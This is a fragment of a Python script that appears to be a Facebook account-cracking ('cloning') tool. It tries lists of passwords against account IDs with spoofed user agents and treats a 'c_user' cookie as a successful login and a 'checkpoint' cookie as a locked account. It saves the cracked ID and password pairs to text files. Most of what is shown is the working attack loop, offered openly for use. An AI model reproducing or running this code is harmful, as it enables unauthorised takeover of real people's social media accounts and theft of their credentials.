...
os.system('xdg-open https://www.facebook.com/kpy710')
...
def riaz():
	os.system('clear')
	print(logo)
	print('[1] Random AFGHSNITAN CLONING')
	...
	if riaz1 =='2':
		os.system('xdg-open https://www.facebook.com/kpy710')
	if riaz1 =='2':
		os.system('xdg-open https://www.facebook.com/kpy710');Adeel()
	else:
        ...
        for ps in pwx:
          ...
          'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[Adeel-OK] '+cid+'|'+ps+'\033[0;97m')
                open('Adeel-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[Adeel-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('Adeel-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mAdeel\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
def approval():
